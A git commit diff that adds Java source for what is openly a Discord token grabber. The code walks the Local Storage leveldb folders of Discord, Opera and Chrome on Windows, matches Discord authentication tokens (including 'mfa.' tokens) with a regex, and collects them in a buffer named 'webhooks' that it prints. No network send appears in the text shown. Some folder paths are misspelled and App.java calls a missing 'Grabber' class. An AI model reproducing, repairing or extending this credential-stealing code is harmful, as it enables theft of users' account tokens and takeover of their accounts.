e90a9b8a45366742593d1e541dc781eb5a1ec205
0xGrayy <155237527+0xGrayy@users.noreply.github.com>
2024-02-25 00:06:42 +0300

    Add files via upload

---
+++ src/App.java
@@ -0,0 +1,7 @@
+public class App {
+    public static void main(String[] args) throws Exception {
+        for(String s : Grabber.getTokens()) {
+            System.out.println(s);
+        }
+    }
+}
--- src/Main.java
+++ src/Main.java
@@ -1,15 +1,87 @@
-//TIP To <b>Run</b> code, press <shortcut actionId="Run"/> or
-// click the <icon src="AllIcons.Actions.Execute"/> icon in the gutter.
-public class Main {
-    public static void main(String[] args) {
-        //TIP Press <shortcut actionId="ShowIntentionActions"/> with your caret at the highlighted text
-        // to see how IntelliJ IDEA suggests fixing it.
-        System.out.printf("Hello and welcome!");
+import javax.sound.midi.SysexMessage;
+import java.io.*;
+import java.util.*;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
-        for (int i = 1; i <= 5; i++) {
-            //TIP Press <shortcut actionId="Debug"/> to start debugging your code. We have set one <icon src="AllIcons.Debugger.Db_set_breakpoint"/> breakpoint
-            // for you, but you can always add more by pressing <shortcut actionId="ToggleLineBreakpoint"/>.
-            System.out.println("i = " + i);
+public class Main {
+
+    public static int cx = 0;
+    public static StringBuilder webhooks = new StringBuilder();
+    public static List<String> paths = new ArrayList<>();
+
+    public static void main(String[] args) {
+        getTokens();
+    }
+
+    public static void consoleLog(Object o) {
+        System.out.println(o);
+    }
+
+    public static String getOSName() {
+        return System.getProperty("os.name");
+    }
+
+    public static String getUserHome(){
+        return System.getProperty("user.home");
+    }
+
+    public static void addPaths(){
+        paths.add(getUserHome() + "/AppData/Romaing/discord/Local Storage/leveldb/");
+        paths.add(getUserHome() + "/AppData/Romaing/discordptb/Local Storage/leveldb/");
+        paths.add(getUserHome() + "/AppData/Romaing/discordcanary/Local Storage/leveldb/");
+        paths.add(getUserHome() + "/AppData/Romaing/Opera Software/Opera Stable/Local Storage/leveldb/");
+        paths.add(getUserHome() + "/ApppData/Romaing/Google/Chrome/User Data/Default/Local Storage/leveldb");
+
+
+    }
+
+    public static void searchUp() {
+        try{
+
+            for(String path: paths){
+                File f = new File(path);
+                String[] pathnames = f.list();
+                if(pathnames == null) continue;
+
+                for(String pathname : pathnames){
+                    try {
+                        FileInputStream fstream = new FileInputStream(path + pathname);
+                        DataInputStream in = new DataInputStream(fstream);
+                        BufferedReader br = new BufferedReader(new InputStreamReader(in));
+
+                        String strLine;
+
+                        while ((strLine = br.readLine()) != null) {
+                            Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
+                            Matcher m = p.matcher(strLine);
+                            while (m.find()) {
+                                if(cx > 0){
+                                    webhooks.append("\n");
+                                }
+                                webhooks.append(" ").append(m.group());
+                                cx++;
+
+                            }
+
+                        }
+
+                    } catch(Exception e){
+
+                    }
+                }
+            }
+
+        } catch(Exception e){
+
+        }
+    }
+    public static void getTokens(){
+        String osName = getOSName();
+        if(osName.contains("Windows")){
+            addPaths();
+            searchUp();
+            consoleLog(webhooks);
         }
     }
 }
